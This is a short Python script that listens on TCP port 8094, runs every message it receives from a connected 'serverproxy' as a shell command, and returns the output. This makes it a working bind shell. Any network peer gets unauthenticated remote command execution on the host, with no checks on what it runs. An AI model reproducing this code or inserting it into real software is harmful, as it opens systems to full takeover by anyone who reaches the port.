import socket
import subprocess

#Init sockets
serversideSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serversideSocket.bind((socket.gethostname(), 8094))
serversideSocket.listen(5)
serverproxySocket, address = serversideSocket.accept()
print("Connection has been established")

while True:
    #Receive message from serverproxy and decode it
    msg = serverproxySocket.recv(1024)
    decodedMsg = msg.decode("utf-8")
    #Run the decoded message in commandline and readout into response variable
    subprocess2 = subprocess.Popen(decodedMsg, shell=True, stdout=subprocess.PIPE)
    response = str(subprocess2.stdout.read())
    
    #Send response back to serverproxy
    serverproxySocket.send(bytes(response, "utf-8"))
    print("response sent to proxy")

serverproxySocket.close()
serversideSocket.close()